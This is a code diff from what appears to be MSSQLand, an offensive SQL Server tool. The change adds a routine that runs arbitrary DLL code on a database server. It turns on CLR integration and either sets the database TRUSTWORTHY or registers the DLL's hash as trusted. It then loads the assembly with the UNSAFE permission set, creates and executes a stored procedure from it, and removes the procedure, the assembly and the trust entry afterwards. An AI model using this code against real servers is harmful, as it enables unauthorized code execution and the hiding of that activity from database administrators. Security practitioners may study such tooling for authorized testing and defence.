@@ -4,6 +4,7 @@ using System.Net;
 using System.Security.Cryptography;
 using MSSQLand.Utilities;
 using MSSQLand.Services;
+using MSSQLand.Models;
 
 namespace MSSQLand.Actions.Execution
 {
@@ -50,21 +51,112 @@ namespace MSSQLand.Actions.Execution
                 return;
             }
 
+            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
+            {
+                return;
+            }
 
-            string libraryHash = library[0];
-            string libraryHexString = library[1];
+            string assemblyHash = library[0];
+            string assemblyHexBytes = library[1];
 
-            Logger.Info($"SHA-512 Hash: {libraryHash}");
-            Logger.Info($"DLL Bytes Length: {libraryHexString.Length}");
+            Logger.Info($"SHA-512 Hash: {assemblyHash}");
+            Logger.Info($"DLL Bytes Length: {assemblyHexBytes.Length}");
+
+            string assemblyName = Guid.NewGuid().ToString("N").Substring(0, 6);
+            string trustedAssemblyDescription = Guid.NewGuid().ToString("N").Substring(0, 6);
+
+            string dropProcedure = $"DROP PROCEDURE IF EXISTS [{_function}];";
+            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{assemblyName}];";
+            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{assemblyHash};";
+
+            Logger.Task("Starting CLR assembly deployment process");
+            try
+            {
+
+                if (databaseContext.Server.Legacy)
+                {
+                    Logger.Info("Legacy server detected. Enabling TRUSTWORTHY property");
+                    databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY ON;");
+                }
+                else
+                {
+                    if (databaseContext.ConfigService.RegisterTrustedAssembly(assemblyHash, trustedAssemblyDescription) == false)
+                    {
+                        return;
+                    }
+                }
+
+                // Step 1: Drop existing procedure and assembly if they exist
+                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
+                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
 
 
-            databaseContext.ConfigService.DeployAndExecuteClrAssembly(
-                Guid.NewGuid().ToString("N").Substring(0, 6),
-                _function,
-                libraryHash,
-                Guid.NewGuid().ToString("N").Substring(0, 6),
-                library[1]
-            );
+                // Step 3: Create the assembly from the DLL bytes
+                Logger.Task("Creating the assembly from DLL bytes");
+                databaseContext.QueryService.ExecuteNonProcessing(
+                    $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{assemblyHexBytes} WITH PERMISSION_SET = UNSAFE;");
+
+                if (!databaseContext.ConfigService.CheckAssembly(assemblyName))
+                {
+                    Logger.Error("Failed to create a new assembly");
+                    databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
+                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
+                    return;
+                }
+
+                Logger.Success($"Assembly '{assemblyName}' successfully created");
+
+                // Step 4: Create the stored procedure linked to the assembly
+                Logger.Task("Creating the stored procedure linked to the assembly");
+                databaseContext.QueryService.ExecuteNonProcessing(
+                    $"CREATE PROCEDURE [dbo].[{_function}] AS EXTERNAL NAME [{assemblyName}].[StoredProcedures].[{_function}];");
+
+                if (!databaseContext.ConfigService.CheckProcedures(_function))
+                {
+                    Logger.Error("Failed to create the stored procedure");
+                    databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
+                    databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
+                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
+                    return;
+                }
+
+                Logger.Success($"Stored procedure '{_function}' successfully created");
+
+                // Step 5: Execute the stored procedure
+                Logger.Task($"Executing the stored procedure '{_function}'");
+                databaseContext.QueryService.ExecuteNonProcessing($"EXEC {_function};");
+                Logger.Success("Stored procedure executed successfully");
+
+                // Step 6: Cleanup - Drop procedure, assembly, and trusted hash
+                Logger.Task("Performing cleanup");
+                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
+                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
+                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
+
+                // Step 7: Reset TRUSTWORTHY property for legacy servers
+                if (databaseContext.Server.Legacy)
+                {
+                    Logger.Info("Resetting TRUSTWORTHY property");
+                    databaseContext.QueryService.ExecuteNonProcessing(
+                        $"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
+                }
+
+                Logger.Success("Cleanup completed");
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Error during CLR assembly deployment: {ex.Message}");
+                // Perform cleanup in case of failure
+                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
+                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
+                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
+
+                if (databaseContext.Server.Legacy)
+                {
+                    databaseContext.QueryService.ExecuteNonProcessing(
+                        $"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
+                }
+            }
         }
 
 
